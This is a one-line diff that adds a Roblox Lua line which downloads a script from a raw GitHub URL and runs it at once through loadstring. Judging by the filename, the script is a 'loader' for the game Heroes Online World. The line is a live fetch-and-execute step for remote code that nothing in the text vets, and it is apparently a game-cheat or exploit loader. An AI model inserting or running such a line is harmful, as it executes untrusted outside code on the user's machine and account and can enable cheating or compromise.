@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PanelTrailNight/loaders/main/loaders/dynamic-fix-heroes-online-world-spam4-6yd2n5gzhgpj2h.lua"))()
